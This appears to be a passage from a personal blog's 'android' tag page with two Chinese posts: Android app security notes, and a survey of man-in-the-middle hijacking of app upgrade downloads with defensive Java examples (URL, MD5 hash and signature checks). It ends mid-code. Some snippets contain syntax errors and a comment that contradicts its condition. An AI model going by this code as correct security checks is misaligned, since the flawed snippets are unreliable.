<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>Tag: android - buffer0verflooow - Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="buffer0verflooow - Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="buffer0verflooow - Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="buffer0verflooow - Blog"><meta property="og:url" content="https://buffer0verflooow.github.io/"><meta property="og:site_name" content="buffer0verflooow - Blog"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://buffer0verflooow.github.io/img/og_image.png"><meta property="article:author" content="buffer0verflooow"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://buffer0verflooow.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://buffer0verflooow.github.io"},"headline":"buffer0verflooow - Blog","image":["https://buffer0verflooow.github.io/img/og_image.png"],"author":{"@type":"Person","name":"buffer0verflooow"},"publisher":{"@type":"Organization","name":"buffer0verflooow - Blog","logo":{"@type":"ImageObject","url":"https://buffer0verflooow.github.io/img/logo.svg"}},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">Tags</a></li><li class="is-active"><a href="#" aria-current="page">android</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-07-30T07:29:09.000Z" title="2022/7/30 15:29:09">2022-07-30</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-11-30T07:39:15.323Z" title="2022/11/30 15:39:15">2022-11-30</time></span><span class="level-item">8 minutes read (About 1212 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/07/30/Android%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">Android安全笔记</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>整理一下 Android APP安全相关的笔记，有些是已经知道了的，但是没有去系统的记录梳理。</p>
<h1 id="安全问题分类"><a href="#安全问题分类" class="headerlink" title="安全问题分类"></a>安全问题分类</h1><h2 id="四大组件"><a href="#四大组件" class="headerlink" title="四大组件"></a>四大组件</h2><p>Android的四大组件有两种对外开放的方式：</p>
<ul>
<li><ol>
<li>通过在<code>manifest</code>文件中声明<code>exported=true</code>；</li>
</ol>
</li>
<li><ol start="2">
<li>如果没有1中的声明，可以通过隐式的Intent进行访问。<br>影响：其他程序可以进行劫持，如果对传入的Intent数据处理不够，有可能导致Dos攻击。<br>解决方案：显示声明<code>exported=false</code>，或者指定Intent的类，或者对权限进行限制。</li>
</ol>
</li>
</ul>
<h2 id="Webview"><a href="#Webview" class="headerlink" title="Webview"></a>Webview</h2><p>Android4.4之前，可以通过js注入获取客户端信息，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsToJava</span>(), <span class="string">&quot;myjsfunction&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>4.4之后需要加入@JavascriptInterface注解。</p>
<h2 id="APP流量请求问题"><a href="#APP流量请求问题" class="headerlink" title="APP流量请求问题"></a>APP流量请求问题</h2><p>主要是指APP使用了HTTP，或者是HTTPS的证书校验不够，导致可以进行中间人攻击，其实就是去实现Android的抓包分析，具体可以看《Android中间人攻击方法整理》这篇笔记。</p>
<h1 id="Android系统安全知识"><a href="#Android系统安全知识" class="headerlink" title="Android系统安全知识"></a>Android系统安全知识</h1><p>Android安全主要由系统框架实现、开发者构建设计和用户授权三个部分。<br>Android安全设计理念：应用程序不应该损害操作系统资源、用户和其他应用程序。因此Android实现了两个层次的安全机制：</p>
<ul>
<li><ol>
<li>Linux层：为每个应用程序分配单独的 Unix 用户（UID）和组（GID）标识符。强制在单独的 Linux 进程中运行每个应用程序。</li>
</ol>
<ul>
<li>1.1 Android 中有一些地方可以用于设置文件、驱动和 Unix 套接字的文件系统权限：init程序、init.rc配置文件、ueventd.rc配置文件和系统 ROM 文件系统配置文件。</li>
</ul>
</li>
<li><ol start="2">
<li>框架层：init进程，位于 Android 文件系统的根目录中，负责创建文件系统基本条目，程序解析<code>init.rc</code>配置文件并执行其中的命令。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">( <span class="type">int</span> argc, <span class="type">char</span> **argv )</span> </span><br><span class="line"> 2 &#123; </span><br><span class="line"> <span class="number">3</span>   ... </span><br><span class="line"> <span class="number">4</span>   <span class="keyword">if</span> (!<span class="built_in">strcmp</span> (basename( argv[<span class="number">0</span>] ), <span class="string">&quot;ueventd&quot;</span>) ) </span><br><span class="line"> <span class="number">5</span>     <span class="keyword">return</span> ueventd_main ( argc, argv ) ; </span><br><span class="line"> <span class="number">6</span>   ... </span><br><span class="line"> <span class="number">7</span>   mkdir(<span class="string">&quot;/dev&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"> <span class="number">8</span>   mkdir(<span class="string">&quot;/proc&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"> <span class="number">9</span>   mkdir(<span class="string">&quot;/sys&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"><span class="number">10</span> </span><br><span class="line"><span class="number">11</span>   mount(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/dev&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, MS_NOSUID, <span class="string">&quot;mode=0755&quot;</span>) ; </span><br><span class="line"><span class="number">12</span>   mkdir(<span class="string">&quot;/dev/pts&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"><span class="number">13</span>   mkdir(<span class="string">&quot;/dev/socket&quot;</span>, <span class="number">0755</span>) ; </span><br><span class="line"><span class="number">14</span>   mount(<span class="string">&quot;devpts&quot;</span>, <span class="string">&quot;/dev/pts&quot;</span>, <span class="string">&quot;devpts&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>) ; </span><br><span class="line"><span class="number">15</span>   mount(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>) ; </span><br><span class="line"><span class="number">16</span>   mount(<span class="string">&quot;sysfs&quot;</span>, <span class="string">&quot;/sys&quot;</span>, <span class="string">&quot;sysfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>) ; </span><br><span class="line"><span class="number">17</span>   ... </span><br><span class="line"><span class="number">18</span>   init_parseconfig_file(<span class="string">&quot;/init.rc&quot;</span>) ; </span><br><span class="line"><span class="number">19</span>   ... </span><br><span class="line"><span class="number">20</span> &#125;</span><br></pre></td></tr></table></figure>
<code>init.rc</code>配置文件使用一种称为 Android Init Language 的语言编写，位于根目录下。在<code>init.rc</code>配置文件中编写的命令定义系统全局变量，为内存管理设置基本内核参数，配置文件系统，启动几个守护进程和进程（不会完全继承init的root权限），更重要的是负责基本文件系统结构的创建，并为创建的节点分配所有者和文件系统权限。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 on fs </span><br><span class="line">2   <span class="comment"># mount mtd partitions </span></span><br><span class="line">3   <span class="comment"># Mount /system rw first to give the filesystem a chance to save a checkpoint </span></span><br><span class="line">4   mount yaffs2 mtd@system /system </span><br><span class="line">5   mount yaffs2 mtd@system /system ro remount </span><br><span class="line">6   mount yaffs2 mtd@userdata /data nosuid nodev </span><br><span class="line">7   mount yaffs2 mtd@cache /cache nosuid nodev</span><br></pre></td></tr></table></figure>
第一个派生自init的守护进程是ueventd守护进程，通过读取<code>ueventd.rc</code>和<code>ueventd.[device name].rc</code>配置文件，重放指定的内核<code>uevent_hotplug</code>事件。 这些事件设置了不同设备的所有者和权限。之后，守护进程等待监听所有未来的热插拔事件。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 ...</span><br><span class="line">2 /dev/ashmem 0666 root root </span><br><span class="line">3 /dev/binder 0666 root root </span><br><span class="line">4 ...</span><br><span class="line">5 /dev/cam 0660 root camera </span><br><span class="line">6 ...</span><br></pre></td></tr></table></figure>
由init程序启动的核心服务之一是servicemanager。 此服务充当在 Android 中运行的所有服务的索引。<br>init进程启动的另一个核心进程是 Zygote。这个不用多说，需要注意的是，Zygote派生的新进程的内存具有“写时复制”（COW）保护，这意味着只有当后者尝试写入受保护的内存时，数据才会从 zygote 进程复制到新进程。<br>init还会启动其他的进程，不多说了。</li>
</ol>
</li>
<li><ol start="3">
<li>Android权限，如System权限等，然后又在此基础上，对权限的等级进行了划分，也就是normal、dangerous、signature和signatureOrSystem。系统权限的定义位于<code>frameworks/base/core/res</code>中。</li>
</ol>
</li>
</ul>
<h1 id="组件相关"><a href="#组件相关" class="headerlink" title="组件相关"></a>组件相关</h1><ol>
<li><p>Activity在Manifest中有一个配置叫做android:priority ，即优先级。这个配置在AOSP的系统应用中很常见，<strong>当Intent可以resolve到多个Activity时，如果其中存在高优先级的Activity则会被直接选择，并不会触发用户选择的流程</strong>。</p>
</li>
<li><p>Intent有个非常特殊的地方，<strong>即Component和Package是两个互不相关的变量</strong>，在resolve一个Intent时，Component的优先级是最高的，当它被设置时，mPackage会被直接忽略。</p>
</li>
</ol>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-07-20T12:35:56.000Z" title="2022/7/20 20:35:56">2022-07-20</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-07-29T14:27:24.318Z" title="2022/7/29 22:27:24">2022-07-29</time></span><span class="level-item">13 minutes read (About 1957 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/07/20/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">Android中间人攻击方法整理</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这里的目标是汇总一些，Android平台上的，基于中间人的，用于植入恶意代码的攻击方法的一个整理，也可以用于其他平台。</p>
<p>能够进行劫持，大部分都是因为使用了HTTP协议。利用的基本思路是：</p>
<ol>
<li>部署中间人设备；</li>
<li>监听网络流量；</li>
<li>当目标请求服务器时，劫持该请求，并响应恶意文件。</li>
</ol>
<p>具体可以参考这个<a target="_blank" rel="noopener" href="https://patentimages.storage.googleapis.com/67/cf/11/ee5bb9a604a455/CN106936849A.pdf">专利</a>。</p>
<h1 id="APP升级过程劫持"><a href="#APP升级过程劫持" class="headerlink" title="APP升级过程劫持"></a>APP升级过程劫持</h1><p>APP版本升级时一般是请求升级接口，如果有升级，服务端返回一个下载地址，下载好APK后，再点击安装。其中，这里有三个地方可以进行劫持，请求升级时、下载文件时和安装时。</p>
<h2 id="请求升级API"><a href="#请求升级API" class="headerlink" title="请求升级API"></a>请求升级API</h2><p>如果使用的是HTTP请求，可以进行劫持，返回一个恶意下载地址。</p>
<p>解决方案：建议使用HTTPS。</p>
<h2 id="下载API"><a href="#下载API" class="headerlink" title="下载API"></a>下载API</h2><p>还是HTTP请求。</p>
<p>解决方案：HTTPS，对服务端返回的文件进行hash校验，<em>还有服务端返回的key进行校验</em>。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在安装时，安装的文件路径被修改了，可能安装了其他奇怪的东西。</p>
<p>解决方案：对APK文件进行包名和签名验证。</p>
<h1 id="安全开发的例子🌰"><a href="#安全开发的例子🌰" class="headerlink" title="安全开发的例子🌰"></a>安全开发的例子🌰</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UpgradeModel</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line">    <span class="keyword">private</span> DataBean data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCode</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMsg</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMsg</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> DataBean <span class="title function_">getData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setData</span><span class="params">(DataBean data)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">DataBean</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String description;</span><br><span class="line">        <span class="keyword">private</span> String downUrl;</span><br><span class="line">        <span class="keyword">private</span> String version;</span><br><span class="line">        <span class="keyword">private</span> String hashcod;</span><br><span class="line">        <span class="keyword">private</span> String key;</span><br><span class="line">        <span class="keyword">private</span> String isForce;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getDescription</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> description;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDescription</span><span class="params">(String description)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.description = description;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getDownUrl</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> downUrl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDownUrl</span><span class="params">(String downUrl)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.downUrl = downUrl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getVersion</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> version;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVersion</span><span class="params">(String version)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.version = version;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getHashcod</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> hashcod;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHashcod</span><span class="params">(String hashcod)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.hashcod = hashcod;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> key;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setKey</span><span class="params">(String key)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.key = key;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getIsForce</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> isForce;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIsForce</span><span class="params">(String isForce)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.isForce = isForce;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UpgradeModel</span>  <span class="variable">aResult</span> <span class="operator">=</span> xxxx<span class="comment">//解析服务器返回的后数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (aResult != <span class="literal">null</span> &amp;&amp; aResult.getData() != <span class="literal">null</span> ) &#123;        </span><br><span class="line">       <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> aResult.getData().getDownUrl(); </span><br><span class="line">       <span class="keyword">if</span> (url == <span class="literal">null</span> || !TextUtils.equals(url, <span class="string">&quot;这里是你知道的下载地址：也可以只验证hostUrl&quot;</span>)) &#123;</span><br><span class="line">              <span class="comment">// 如果符合，说明不是目标下载地址，就不去下载</span></span><br><span class="line"></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>下载</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> DownUtils.getFile(url); <span class="comment">// 监测是否要重新下载</span></span><br><span class="line"><span class="keyword">if</span> (file.exists() &amp;&amp;   TextUtils.equals(aResult.getData().getHashCode(), EncryptUtils.Md5File(file))) </span><br><span class="line">  &amp;&amp; TextUtils.equals(aResult.getData().getKey(), DownLoadModel.getData().getKey()) &#123;/   </span><br><span class="line">       <span class="comment">// 如果符合，就去安装 不符合重新下载 删除恶意文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>安装</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** installApK</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> path</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">*/</span><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">installApK</span><span class="params">(Context context, <span class="keyword">final</span> String path, <span class="keyword">final</span> String name )</span> &#123;    </span><br><span class="line">       <span class="keyword">if</span> (!SafetyUtils.checkFile(path + name, context)) &#123;        </span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (!SafetyUtils.checkPagakgeName(context, path + name)) &#123;</span><br><span class="line">              Toast.makeText(context, <span class="string">&quot;升级包被恶意软件篡改 请重新升级下载安装&quot;</span>, Toast.LENGTH_SHORT ).show();</span><br><span class="line">              DLUtils.deleteFile(path + name);</span><br><span class="line">              ((Activity)context).finish();</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">switch</span> (SafetyUtils.checkPagakgeSign(context, path + name)) &#123;</span><br><span class="line">       <span class="keyword">case</span> SafetyUtils.SUCCESS:</span><br><span class="line">              DLUtils.openFile(path + name, context);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> SafetyUtils.SIGNATURES_INVALIDATE:</span><br><span class="line">              Toast.makeText(context, <span class="string">&quot;升级包安全校验失败 请重新升级&quot;</span>, Toast.LENGTH_SHORT ).show();</span><br><span class="line">              ((Activity)context).finish();</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> SafetyUtils.VERIFY_SIGNATURES_FAIL:</span><br><span class="line">              Toast.makeText(context, <span class="string">&quot;升级包为盗版应用 请重新升级&quot;</span>, Toast.LENGTH_SHORT ).show();</span><br><span class="line">              ((Activity)context).finish();</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>安全校验</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span 